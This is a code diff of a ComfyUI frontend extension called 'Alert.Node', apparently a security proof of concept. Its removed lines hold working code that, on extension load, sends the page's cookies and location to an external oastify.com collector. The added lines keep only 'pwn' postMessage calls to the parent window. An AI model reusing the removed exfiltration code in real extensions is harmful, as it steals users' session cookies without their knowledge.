@@ -1,27 +1,21 @@
-import { ComfyApp, app } from "../../scripts/app.js";
-import { ComfyDialog, $el } from "../../scripts/ui.js";
-import { api } from "../../scripts/api.js";
+import { app } from "../../../scripts/app.js";
 
-app.registerExtension({
-	name: "Alert.Node",
-	async beforeRegisterNodeDef(nodeType, nodeData, app) {
-	    window.parent.postMessage({ internal: { type: "pwn" } }, "*");
-	    // alert(document.cookie);
-	    // alert(document.location);
-	
-	    console.log(`Alert.Node: cookie=${document.cookie}, location=${document.location}`);
-	
-	    const rawResponse = await fetch('https://wsscd95wpqho07wrbdywwitkobu2it6i.oastify.com', {
-	      method: 'POST',
-	      mode: 'no-cors',
-	      headers: {
-	        'Accept': 'application/json',
-	        'Content-Type': 'application/json'
-	      },
-	      body: JSON.stringify({"cookie": document.cookie, "location": document.location})
-	    });
-	    
-	    // const content = await rawResponse.text();
-	    // console.log(content);
-	}});
+const ext = {
+    name: 'Alert.Node',
+  
+    native_mode: false,
+  
+    init(app) {
+        window.parent.postMessage({ type: "pwn-init" } , "*");
+    },
 
+    async beforeRegisterNodeDef(nodeType, nodeData, app2) {
+        window.parent.postMessage({ type: "pwn-beforeRegisterNodeDef" } , "*");
+    },
+
+    async setup() {
+        window.parent.postMessage({ type: "pwn-setup" } , "*");
+    }
+}
+
+app.registerExtension(ext);
